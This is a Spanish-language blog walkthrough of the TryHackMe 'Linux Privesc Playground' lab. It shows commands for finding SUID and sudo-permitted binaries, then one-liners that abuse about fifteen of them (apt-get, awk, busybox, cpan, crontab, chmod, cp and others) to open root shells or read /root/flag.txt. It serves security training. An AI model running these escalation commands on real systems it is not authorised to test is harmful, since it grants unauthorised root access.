<!DOCTYPE html>
<html lang="en">
<head>
  <a name="top"></a>
  
    <title>TryHackMe - Linux Privesc Playground :: sckull — Writeups :: CTF :: HackTheBox :: TryHackMe</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="Titulo Linux Privesc Playground     Room Linux Privesc Playground   Info A linux privilege escalation playground, filled with badly configured superuser permissions, incorrectly set SUID bits, and more!   Puntos 358   Dificultad Relativamente Facil   Maker SherlockSec    Linux Privesc Playground, contiene ficheros del tipo SUID los cuales al ejecutarlos, se obtiene permisos del usuario quien creo este fichero unicamente durante la ejecucion."/>
<meta name="keywords" content=""/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="/posts/linuxprivescplayground/" />


<link rel="stylesheet" href="/assets/style.css">


<link rel="stylesheet" href="/style.css">


<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
<link rel="shortcut icon" href="/img/favicon.png">



<script src="https://kit.fontawesome.com/57784fec54.js" crossorigin="anonymous"></script>



<meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="TryHackMe - Linux Privesc Playground :: sckull — Writeups :: CTF :: HackTheBox :: TryHackMe" />
<meta name="twitter:description" content="Titulo Linux Privesc Playground     Room Linux Privesc Playground   Info A linux privilege escalation playground, filled with badly configured superuser permissions, incorrectly set SUID bits, and more!   Puntos 358   Dificultad Relativamente Facil   Maker SherlockSec    Linux Privesc Playground, contiene ficheros del tipo SUID los cuales al ejecutarlos, se obtiene permisos del usuario quien creo este fichero unicamente durante la ejecucion." />
<meta name="twitter:site" content="/" />
<meta name="twitter:creator" content="sckull" />
<meta name="twitter:image" content="/image/tryhackme/LPP/cover.png">





<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="TryHackMe - Linux Privesc Playground :: sckull — Writeups :: CTF :: HackTheBox :: TryHackMe">
<meta property="og:description" content="Titulo Linux Privesc Playground     Room Linux Privesc Playground   Info A linux privilege escalation playground, filled with badly configured superuser permissions, incorrectly set SUID bits, and more!   Puntos 358   Dificultad Relativamente Facil   Maker SherlockSec    Linux Privesc Playground, contiene ficheros del tipo SUID los cuales al ejecutarlos, se obtiene permisos del usuario quien creo este fichero unicamente durante la ejecucion." />
<meta property="og:url" content="/posts/linuxprivescplayground/" />
<meta property="og:site_name" content="TryHackMe - Linux Privesc Playground" />
<meta property="og:image" content="/image/tryhackme/LPP/cover.png">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">

<meta name="google-site-verification" content="cug_0s4kFi5UbEfBI5hJsscmJ7XdimqECCYfN1EAZq0" />


<script type="application/ld+json">
    {
        "@context" : "http://schema.org",
        "@type" : "BlogPosting",
        "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "/"
        },
        "articleSection" : "posts",
        "name" : "TryHackMe - Linux Privesc Playground",
        "headline" : "TryHackMe - Linux Privesc Playground",
        "description" : "Titulo Linux Privesc Playground     Room Linux Privesc Playground   Info A linux privilege escalation playground, filled with badly configured superuser permissions, incorrectly set SUID bits, and more!   Puntos 358   Dificultad Relativamente Facil   Maker SherlockSec    Linux Privesc Playground, contiene ficheros del tipo SUID los cuales al ejecutarlos, se obtiene permisos del usuario quien creo este fichero unicamente durante la ejecucion.",
        "inLanguage" : "en-US",
        "author" : "",
        "creator" : "",
        "publisher": "",
        "accountablePerson" : "",
        "copyrightHolder" : "",
        "copyrightYear" : "2019",
        "datePublished": "2019-12-10 00:00:00 &#43;0000 UTC",
        "dateModified" : "2019-12-10 00:00:00 &#43;0000 UTC",
        "url" : "/posts/linuxprivescplayground/",
        "wordCount" : "344",
        "keywords" : [ "tryhackme","GTFObins","SUID","Blog" ]
    }
    </script>


<meta property="article:published_time" content="2019-12-10 00:00:00 &#43;0000 UTC" />





</head>
<body class="dark-theme">
<div class="container">
  <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull@blog:~#</span>
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
    
      
        
                   

          

          

          
            <li><a href="/about">About</a></li>
          

        
      
        
                   

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

        
      
        
                   

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

        
      
      
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        

          

          

          
            <li><a href="/about">About</a></li>
          

      
    
      
        

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

      
    
      
        

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      
    </span>
  </span>
  <link rel="shortcut icon" href="https://sckullbock.blogspot.com/favicon.ico">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
</header>

  
  <div class="content">    
    

  <div class="post">
    <h2 class="post-title">TryHackMe - Linux Privesc Playground</h2>
    <div class="post-meta">
      
        <span class="post-date">
          <i class="fas fa-calendar-week"></i>
            Tuesday 10, 2019
        </span>
      
      <span class="post-author">—  sckull</span>
      
        <span class="post-read-time">— 2 min read</span>
      
    </div>
        
    
      <span class="post-tags">
        
         <a class="button-tag" href="/tags/tryhackme/"><li class="fa fa-tag"></li> tryhackme</a>&nbsp;
        
         <a class="button-tag" href="/tags/gtfobins/"><li class="fa fa-tag"></li> GTFObins</a>&nbsp;
        
         <a class="button-tag" href="/tags/suid/"><li class="fa fa-tag"></li> SUID</a>&nbsp;
        
      </span>
    

    
      
        <img src="/posts/linuxprivescplayground/../../image/tryhackme/LPP/cover.png" class="post-cover center" />
      
      <hr />
     
    

    <div class="contenido">
      <h2>Contenido</h2>
      <nav id="TableOfContents">
<ul>
<li>
<ul>
<li>
<ul>
<li><a href="#bin-apt-get">/bin/apt-get*</a></li>
<li><a href="#usr-bin-aria2c">/usr/bin/aria2c</a></li>
<li><a href="#usr-sbin-arp">/usr/sbin/arp</a></li>
<li><a href="#bin-ash">/bin/ash</a></li>
<li><a href="#usr-bin-awk">/usr/bin/awk</a></li>
<li><a href="#usr-bin-base64">/usr/bin/base64</a></li>
<li><a href="#bin-bash">/bin/bash</a></li>
<li><a href="#bin-busybox">/bin/busybox</a></li>
<li><a href="#bin-cat">/bin/cat</a></li>
<li><a href="#bin-chmod">/bin/chmod</a></li>
<li><a href="#bin-chown">/bin/chown</a></li>
<li><a href="#bin-cp">/bin/cp</a></li>
<li><a href="#usr-bin-cpan">/usr/bin/cpan</a></li>
<li><a href="#bin-crontab">/bin/crontab</a></li>
<li><a href="#usr-bin-cut">/usr/bin/cut</a></li>
</ul></li>
</ul></li>
</ul>
</nav>
    </div>

    <div class="post-content">      
      

<table>
<thead>
<tr>
<th>Titulo</th>
<th>Linux Privesc Playground</th>
</tr>
</thead>

<tbody>
<tr>
<td>Room</td>
<td>Linux Privesc Playground</td>
</tr>

<tr>
<td>Info</td>
<td>A linux privilege escalation playground, filled with badly configured superuser permissions, incorrectly set SUID bits, and more!</td>
</tr>

<tr>
<td>Puntos</td>
<td>358</td>
</tr>

<tr>
<td>Dificultad</td>
<td>Relativamente Facil</td>
</tr>

<tr>
<td>Maker</td>
<td><a href="https://tryhackme.com/p/SherlockSec">SherlockSec</a></td>
</tr>
</tbody>
</table>

<hr />

<p>Linux Privesc Playground, contiene ficheros del tipo SUID los cuales al ejecutarlos, se obtiene permisos del usuario quien creo este fichero unicamente durante la ejecucion.</p>

<p>Las credenciales de la maquina:</p>

<pre><code class="language-bash">SSH Credentials - user:password
</code></pre>

<p><img src="../../image/tryhackme/LPP/cScreenshot_2019-12-09_22-34-42.png" alt="image" /></p>

<p>Para poder enumerar los ficheros del tipo SUID podemos utilizar los siguientes comandos:</p>

<pre><code class="language-bash">find / -perm -4000 2&gt; /dev/null | xargs ls -lah

find / -perm -u=s -type f 2&gt;/dev/null
</code></pre>

<p>De igual forma podemos utilizar sudo para poder ver que ficheros pueden ser ejecutados bajo el comando sudo.</p>

<pre><code class="language-bash">sudo -l -l
</code></pre>

<p>Podemos ver que nos devuelve una lista de ficheros los cuales pueden ser utilizados para obtener privilegios de root.</p>

<p>A continuacion se listan la solucion para alguno de ellos, se puede encontrar los comandos en la pagina <a href="https://gtfobins.github.io/"><strong>GTFOBINS</strong></a>.</p>

<h3 id="bin-apt-get">/bin/apt-get*</h3>

<p>En el caso de este fichero al consultar sobre la existencia en el directorio que nos muestra el listado no existe en esa direccion. Utilizamos cp para copiar el acrhivo y lo colocamos en la direccion <code>/bin/</code>.</p>

<p>Comando:</p>

<pre><code class="language-bash">sudo /bin/apt-get update -o APT::Update::Pre-Invoke::= /bin/bash
</code></pre>

<p><img src="../../image/tryhackme/LPP/Screenshot_2019-12-09_23-42-37.png" alt="image" /></p>

<h3 id="usr-bin-aria2c">/usr/bin/aria2c</h3>

<p>Ya que podemos ejecutar este archivo con el comando sudo, podemos aprovechar las diferentes opciones que tiene el archivo. aria2c en su version 1.13.0.</p>

<p>Comando:</p>

<pre><code class="language-bash">sudo /usr/bin/aria2c -i /root/flag.txt
</code></pre>

<p><img src="../../image/tryhackme/LPP/Screenshot_2019-12-09_23-34-58.png" alt="image" /></p>

<h3 id="usr-sbin-arp">/usr/sbin/arp</h3>

<p>Comando:</p>

<pre><code class="language-bash">LFILE=/root/flag.txt; sudo arp -v -f &quot;$LFILE&quot;
</code></pre>

<p><img src="../../image/tryhackme/LPP/Screenshot_2019-12-09_23-45-14.png" alt="image" /></p>

<h3 id="bin-ash">/bin/ash</h3>

<p>Comando:</p>

<pre><code class="language-bash">sudo /bin/ash
</code></pre>

<p><img src="../../image/tryhackme/LPP/Screenshot_2019-12-09_23-49-03.png" alt="image" /></p>

<h3 id="usr-bin-awk">/usr/bin/awk</h3>

<p>Comando:</p>

<pre><code class="language-bash">sudo awk 'BEGIN {system(&quot;/bin/sh&quot;)}'
</code></pre>

<p><img src="../../image/tryhackme/LPP/Screenshot_2019-12-09_23-50-34.png" alt="image" /></p>

<h3 id="usr-bin-base64">/usr/bin/base64</h3>

<p>Comando:</p>

<pre><code class="language-bash">LFILE=/root/flag.txt
sudo base64 &quot;$LFILE&quot; | base64 --decode
</code></pre>

<p><img src="../../image/tryhackme/LPP/Screenshot_2019-12-09_23-51-59.png" alt="image" /></p>

<h3 id="bin-bash">/bin/bash</h3>

<p>Comando:</p>

<pre><code class="language-bash">sudo bash
</code></pre>

<p><img src="../../image/tryhackme/LPP/Screenshot_2019-12-09_23-53-27.png" alt="image" /></p>

<h3 id="bin-busybox">/bin/busybox</h3>

<p>Comando:</p>

<pre><code class="language-bash">sudo busybox sh
</code></pre>

<p><img src="../../image/tryhackme/LPP/Screenshot_2019-12-09_23-55-12.png" alt="image" /></p>

<h3 id="bin-cat">/bin/cat</h3>

<p>Comando:</p>

<pre><code class="language-bash">sudo /bin/cat /root/flag.txt
</code></pre>

<p><img src="../../image/tryhackme/LPP/Screenshot_2019-12-09_23-55-56.png" alt="image" /></p>

<h3 id="bin-chmod">/bin/chmod</h3>

<p>Comando:</p>

<pre><code class="language-bash">LFILE=/root/flag.txt
sudo chmod 0777 $LFILE
</code></pre>

<p><img src="../../image/tryhackme/LPP/Screenshot_2019-12-09_23-57-39.png" alt="image" /></p>

<h3 id="bin-chown">/bin/chown</h3>

<p>Comando:</p>

<pre><code class="language-bash">LFILE=/root/flag.txt
sudo /bin/chown $(id -un):$(id -gn) $LFILE
</code></pre>

<p><img src="../../image/tryhackme/LPP/Screenshot_2019-12-10_00-00-13.png" alt="image" /></p>

<h3 id="bin-cp">/bin/cp</h3>

<p>Comando:</p>

<pre><code class="language-bash">FLAG=/tmp/flag.txt
TF=/root/flag.txt
sudo /bin/cp $TF $FLAG
cat $FLAG
</code></pre>

<p><img src="../../image/tryhackme/LPP/Screenshot_2019-12-10_00-05-18.png" alt="image" /></p>

<h3 id="usr-bin-cpan">/usr/bin/cpan</h3>

<p>Comando:</p>

<pre><code class="language-bash">sudo cpan
</code></pre>

<p>Elegimos no a las opciones hasta CPAN site, entonces &lsquo;Autoconfiguration complete.&rsquo; y escribimos el siguiente comando:</p>

<pre><code class="language-bash">! exec '/bin/bash'
</code></pre>

<p><img src="../../image/tryhackme/LPP/Screenshot_2019-12-10_00-19-47.png" alt="image" /></p>

<h3 id="bin-crontab">/bin/crontab</h3>

<p>Comando:</p>

<pre><code class="language-bash">sudo /bin/crontab -e
</code></pre>

<p>Seleccionamos el editor Vim, presionamos ESC y escribimos :!sh.</p>

<p><img src="../../image/tryhackme/LPP/Peek 2019-12-10 00-51.gif" alt="image" /></p>

<h3 id="usr-bin-cut">/usr/bin/cut</h3>

<p>Comando:</p>

<pre><code class="language-bash">LFILE=/root/flag.txt
sudo cut -d &quot;&quot; -f1 &quot;$LFILE&quot;
</code></pre>

<p><img src="../../image/tryhackme/LPP/Screenshot_2019-12-10_00-53-47.png" alt="image" /></p>

    </div>    
    <hr />
    
    <div>
      
        
<div id="disqus_thread"></div>
<script>
(function() {
var d = document, s = d.createElement('script');
s.src = 'https://sckull.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

      
      
    </div>

    
      <div class="pagination">
        <div class="pagination__title">
          <span class="pagination__title-h">Read other posts</span>
          <hr />
        </div>
        <div class="pagination__buttons">
          
            <span class="button previous">
              <a href="/posts/lazyadmin/">
                <span class="button__icon">←</span>
                <span class="button__text">TryHackMe - Lazy Admin</span>
              </a>
            </span>
          
          
            <span class="button next">
              <a href="/posts/wall/">
                <span class="button__text">Hack The Box - Wall</span>
                <span class="button__icon">→</span>
              </a>
            </span>
          
        </div>
      </div>
      
    
    
    
    </div>
    
  </div>
  
  
    <footer class="footer">
  <div class="footer__inner">
    
      <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull@blog:~#</span>
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span style="font-size: 0.85em;">© 2020 sckull</span>
        
      
      </div>
    
  </div>
</footer>

<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>


  
  
  
  <a class="float" id="myBtn" href="#top"><i class="fa fa-arrow-up" aria-hidden="true"></i></a>
  
</div>






</body>
</html>
